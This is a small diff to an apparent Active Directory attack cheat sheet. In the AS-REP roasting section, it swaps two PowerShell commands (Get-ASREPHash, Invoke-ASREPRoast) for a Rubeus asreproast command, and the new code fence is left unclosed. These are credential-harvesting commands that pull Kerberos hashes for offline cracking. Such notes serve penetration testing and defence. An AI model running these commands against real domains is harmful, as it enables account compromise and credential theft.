@@ -512,11 +512,7 @@ OR using ActiveDirectory module:
 
 #### Get AS-REPs
 
-```Get-ASREPHash -UserName VPN1user -Verbose```
-
-OR to enumerate all users with Kerberos preauth disabled and request a hash automagically:
-
-```Invoke-ASREPRoast -Verbose```
+```.\Rubeus.exe asreproast
 
 #### Cracking hashes
 
